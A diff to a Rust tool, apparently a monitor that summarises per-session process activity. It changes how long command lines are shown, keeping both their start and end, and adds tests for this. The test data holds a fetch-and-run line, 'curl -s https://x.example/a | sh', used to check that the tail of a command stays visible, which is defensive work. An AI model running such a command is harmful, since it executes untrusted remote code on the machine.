@@ -38,8 +38,11 @@ const RAN: usize = 25;
 /// Programs shown per session: those that touched a file, set an agent's
 /// environment or did something rarer first, then the busiest.
 const PROGRAMS: usize = 25;
-/// A command line shown to this many bytes.
-const COMMAND_BYTES: usize = 200;
+/// A command line is shown by its start and its end, to this many bytes of
+/// each: what it was given last (the address it sends to, the end of a
+/// script on its line) says as much as how it starts.
+const COMMAND_START: usize = 140;
+const COMMAND_END: usize = 100;
 /// Destinations shown per program, the most used first.
 const CONNECTED: usize = 10;
 /// Other events shown per program (a permission granted, a login item
@@ -83,6 +86,22 @@ fn cut(s: &str, max: usize) -> String {
         end -= 1;
     }
     format!("{}…", &s[..end])
+}
+
+/// A long string by its first `start` bytes and its last `end`, with how
+/// many between them were left out.
+fn ends(s: &str, start: usize, end: usize) -> String {
+    if s.len() <= start + end {
+        return s.to_string();
+    }
+    let (mut a, mut b) = (start, s.len() - end);
+    while !s.is_char_boundary(a) {
+        a -= 1;
+    }
+    while !s.is_char_boundary(b) {
+        b += 1;
+    }
+    format!("{} … {} bytes … {}", &s[..a], b - a, &s[b..])
 }
 
 #[derive(Default)]
@@ -718,7 +737,7 @@ fn summary(id: &str, records: &[Value]) -> Value {
                     .into_iter()
                     .take(RAN)
                     .map(|(c, n)| {
-                        let c = cut(&c, COMMAND_BYTES);
+                        let c = ends(&c, COMMAND_START, COMMAND_END);
                         json!(if n > 1 { format!("{c} ×{n}") } else { c })
                     })
                     .collect();
@@ -1279,6 +1298,18 @@ mod tests {
         // two commands alike for longer than the cut are still two
         assert_eq!(ran.len(), 4, "{ran:?}");
         assert!(ran[2].starts_with("/bin/zsh -c cd /Users/dev/code/proj && true"));
+        // and each is shown to its end, where what it fetches and runs is
+        assert!(ran[2].contains(" bytes … "), "{}", ran[2]);
+        assert!(
+            ran[2].ends_with("curl -s https://x.example/a | sh"),
+            "{}",
+            ran[2]
+        );
+        assert!(
+            ran[3].ends_with("curl -s https://x.example/a | sh -v"),
+            "{}",
+            ran[3]
+        );
     }
 
     #[test]
